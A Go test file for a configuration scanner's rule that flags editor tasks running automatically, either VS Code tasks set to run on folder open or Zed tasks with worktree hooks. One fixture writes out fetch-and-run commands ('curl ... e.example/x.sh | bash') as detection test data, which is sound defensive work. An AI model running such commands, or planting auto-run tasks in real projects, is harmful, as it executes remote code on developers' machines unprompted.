package rules

import (
	"strings"
	"testing"

	"github.com/cfgaudit/cfgaudit/internal/finding"
	"github.com/cfgaudit/cfgaudit/internal/parser"
)

func tasksTarget(tasks ...parser.VSCodeTask) *Target {
	return &Target{
		Scope:           finding.ScopeProject,
		VSCodeTasksFile: ".vscode/tasks.json",
		VSCodeTasks:     &parser.VSCodeTasks{Version: "2.0.0", Tasks: tasks},
	}
}

func TestCFG047_FolderOpen(t *testing.T) {
	f := CFG047.Check(tasksTarget(parser.VSCodeTask{
		Label:      "bootstrap",
		Command:    "make",
		RunOptions: &parser.VSCodeRunOptions{RunOn: "folderOpen"},
	}))
	if len(f) != 1 || f[0].Severity != finding.Error {
		t.Fatalf("expected 1 error, got %+v", f)
	}
	if f[0].File != ".vscode/tasks.json" || !strings.Contains(f[0].Message, "bootstrap") {
		t.Errorf("expected finding naming the task and file, got %+v", f[0])
	}
}

func TestCFG047_SilentVariant(t *testing.T) {
	f := CFG047.Check(tasksTarget(parser.VSCodeTask{
		Label:        "evil",
		RunOptions:   &parser.VSCodeRunOptions{RunOn: "folderOpen"},
		Presentation: &parser.VSCodePresentation{Reveal: "never"},
	}))
	if len(f) != 1 || !strings.Contains(f[0].Message, "silently") {
		t.Fatalf("expected silent-variant message, got %+v", f)
	}
}

func TestCFG047_UnlabelledUsesCommand(t *testing.T) {
	f := CFG047.Check(tasksTarget(parser.VSCodeTask{
		Command:    "./setup.sh",
		RunOptions: &parser.VSCodeRunOptions{RunOn: "folderOpen"},
	}))
	if len(f) != 1 || !strings.Contains(f[0].Message, "./setup.sh") {
		t.Errorf("expected command used as name, got %+v", f)
	}
}

func TestCFG047_NonFolderOpen_NoFinding(t *testing.T) {
	cases := []parser.VSCodeTask{
		{Label: "build", Command: "make"},                                        // no runOptions
		{Label: "build", RunOptions: &parser.VSCodeRunOptions{RunOn: "default"}}, // explicit default
	}
	for _, c := range cases {
		if f := CFG047.Check(tasksTarget(c)); len(f) != 0 {
			t.Errorf("expected no finding for %+v, got %+v", c, f)
		}
	}
}

func TestCFG047_NoTasks_NoFinding(t *testing.T) {
	if f := CFG047.Check(&Target{}); len(f) != 0 {
		t.Errorf("expected no finding when no tasks.json, got %+v", f)
	}
}

func TestCFG047_CaseInsensitiveRunOn(t *testing.T) {
	f := CFG047.Check(tasksTarget(parser.VSCodeTask{
		Label:      "x",
		RunOptions: &parser.VSCodeRunOptions{RunOn: "FolderOpen"},
	}))
	if len(f) != 1 {
		t.Errorf("expected folderOpen match to be case-insensitive, got %+v", f)
	}
}

// #435: a Zed task carrying a `hooks` entry is spawned by Zed itself, so the
// command runs with no prompt for it.
func zedTasksTarget(tasks ...parser.ZedTask) *Target {
	return &Target{
		Scope:        finding.ScopeProject,
		ZedTasks:     &parser.ZedTasks{Tasks: tasks},
		ZedTasksFile: ".zed/tasks.json",
	}
}

func TestCFG047_ZedHookTask(t *testing.T) {
	f := CFG047.Check(zedTasksTarget(parser.ZedTask{
		Label: "setup", Command: "sh", Hooks: []string{"create_worktree"},
	}))
	if len(f) != 1 || f[0].Severity != finding.Warn {
		t.Fatalf("expected 1 Warn, got %+v", f)
	}
	if !strings.Contains(f[0].Message, "create_worktree") {
		t.Errorf("message should name the hook, got %q", f[0].Message)
	}
	// The trust asymmetry is the point of the finding, so it must be stated.
	if !strings.Contains(f[0].Message, "not worktree-trust gated") {
		t.Errorf("message should state that tasks.json is not trust-gated, got %q", f[0].Message)
	}
}

func TestCFG047_ZedHookAlias(t *testing.T) {
	f := CFG047.Check(zedTasksTarget(parser.ZedTask{
		Label: "setup", Command: "sh", Hooks: []string{"create_git_worktree"},
	}))
	if len(f) != 1 || f[0].Severity != finding.Warn {
		t.Fatalf("the serde alias must be flagged too, got %+v", f)
	}
}

func TestCFG047_ZedSilentHookTask(t *testing.T) {
	f := CFG047.Check(zedTasksTarget(parser.ZedTask{
		Label: "setup", Command: "sh", Hooks: []string{"create_worktree"}, Reveal: "never",
	}))
	if len(f) != 1 {
		t.Fatalf("expected 1 finding, got %+v", f)
	}
	if !strings.Contains(f[0].Message, "without showing it") {
		t.Errorf("a silent task should be called out, got %q", f[0].Message)
	}
}

// A task with no hook is one the user picks from the task list, no more a
// committed-execution surface than a Makefile target.
func TestCFG047_ZedPlainTaskSilent(t *testing.T) {
	f := CFG047.Check(zedTasksTarget(
		parser.ZedTask{Label: "test", Command: "cargo test"},
		parser.ZedTask{Label: "unknown hook", Command: "echo x", Hooks: []string{"not_a_hook"}},
	))
	if len(f) != 0 {
		t.Errorf("expected no findings, got %+v", f)
	}
}

func TestCFG047_ZedNoTasks(t *testing.T) {
	if f := CFG047.Check(&Target{Scope: finding.ScopeProject}); len(f) != 0 {
		t.Errorf("expected no findings, got %+v", f)
	}
}

// The hook task's command is a command site; a plain task's is not.
func TestCFG047_ZedHookTaskIsCommandSite(t *testing.T) {
	target := zedTasksTarget(
		parser.ZedTask{Label: "hooked", Command: "curl", Args: []string{"-s", "https://e.example/x.sh", "|", "bash"}, Hooks: []string{"create_worktree"}},
		parser.ZedTask{Label: "manual", Command: "curl -s https://e.example/y.sh | bash"},
	)
	sites := commandSites(target)
	if len(sites) != 1 {
		t.Fatalf("expected exactly the hooked task to be a command site, got %+v", sites)
	}
	if !strings.Contains(sites[0].Label, "hooked") {
		t.Errorf("wrong task became a command site: %q", sites[0].Label)
	}
	if !strings.Contains(sites[0].Command, "https://e.example/x.sh") {
		t.Errorf("args should be joined into the command, got %q", sites[0].Command)
	}
}
